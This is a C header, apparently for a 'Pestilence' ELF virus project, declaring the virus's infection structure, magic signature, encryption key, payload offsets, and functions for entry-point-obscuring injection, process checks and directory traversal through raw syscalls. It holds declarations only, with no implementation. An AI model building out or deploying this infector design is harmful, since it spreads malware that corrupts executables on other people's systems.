#ifndef PESTILENCE_H
# define PESTILENCE_H

# define _GNU_SOURCE 1
# include <elf.h>
# include <unistd.h>
# include <sys/mman.h>
# include <stdlib.h>
# include <stdio.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <limits.h>

# define KEY 0x12345678
# define SUB 0x95837523
# define MAGIC_VIRUS 0x4E505241
# define SIGN_SIZE 0x28

# define FT_MEMCPY_ADDR 0x12a0
# define BUF_SIZE 0x20
# define END_SIZE 0x97
# define LOADER_SIZE 0xCD
# define PAYLOAD_SIZE 0x2849 - FT_MEMCPY_ADDR + 0x7
# define MAIN_OFFSET 0x27af - FT_MEMCPY_ADDR
# define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4

# define OFFSET_1 0x1ef1 - FT_MEMCPY_ADDR
# define OFFSET_2 0x2018 - FT_MEMCPY_ADDR
# define OFFSET_3 0x213d - FT_MEMCPY_ADDR

typedef struct		s_info
{
	void		*file;
	size_t		file_size;
	void		*text_begin;
	size_t		text_size;
	size_t		text_addr;

	void		*addr_call_to_replace;
	void		*addr_hooked_func;

	size_t		bss_size;
	size_t		begin_bss;
	size_t		offset_payload;
	size_t		addr_payload;

	int32_t		 valid_target;
}					t_info;

struct linux_dirent64 {
	ino64_t        d_ino;    /* 64-bit inode number */
	off64_t        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[PATH_MAX]; /* Filename (null-terminated) */
};

void		loader();
int			main();
void		ft_end();
void		woody();

/*			**** FILL_BUFF ****					*/
void		write_begin(char *buf);
void		write_filename_src(char *buf);
void		write_test(char *buf);
void		write_test2(char *buf);
void		write_sign(char *buf);
void		write_proc(char *buf);
void		write_inhibitor(char *buf);
void		write_stat(char *buf);

/*			**** PARSING ****					*/
int			find_text(t_info *info);
void		epo_parsing(t_info *info);
void		pe_parsing(t_info *info);
void		patch_end(t_info *info, int32_t nb);
int			check_process(char *buf_path);

/*			**** LIB HANDLERS	****			*/
void		ft_memcpy(void *dest, void *src, size_t size);
void		ft_bzero(void *ptr, size_t size);
char		*ft_strcat(char *dest, const char *src);
int			ft_sysopen(const char *pathname, int flags);
int			ft_sysclose(int fd);
ssize_t 	ft_syswrite(int fd, const void *buf, size_t count);
void		*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
void		*ft_sysmunmap(void *addr, size_t len);
int			ft_sysfstat(int fd, struct stat *buf); 
int			ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
ssize_t		ft_sysread(int fd, void *buf, size_t count);
int			ft_strncmp(const char *s1, const char *s2, int n);
int			ft_strlen(const char *s);
void		handle_exit(void *addr);

#endif
